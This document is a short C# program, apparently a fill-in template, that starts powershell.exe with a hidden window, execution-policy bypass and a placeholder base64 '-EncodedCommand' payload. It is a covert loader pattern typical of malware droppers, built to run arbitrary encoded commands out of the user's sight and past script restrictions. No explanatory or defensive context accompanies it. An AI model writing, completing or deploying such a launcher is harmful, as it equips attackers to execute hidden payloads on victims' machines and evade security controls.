using System.Diagnostics;

static class Program {
    [System.STAThread]
    static void Main() {
        string encoded = "<YOUR_BASE64_STRING>";
        string psArgs = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}";
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
